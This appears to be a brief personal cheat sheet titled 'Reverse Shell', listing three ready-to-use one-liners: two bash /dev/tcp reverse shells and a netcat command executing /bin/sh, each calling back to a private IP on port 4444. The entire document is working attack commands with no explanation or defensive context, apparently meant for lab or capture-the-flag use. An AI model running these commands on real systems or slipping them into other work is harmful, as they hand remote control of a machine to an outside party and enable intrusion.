# Reverse Shell

```
bash -i >& /dev/tcp/192.168.11.146/4444 0>&1
```

```
bash -c 'bash -i >& /dev/tcp/10.10.16.2/4444 0>&1'
```

```
nc -nv 10.10.14.30 4444 -e /bin/sh
```

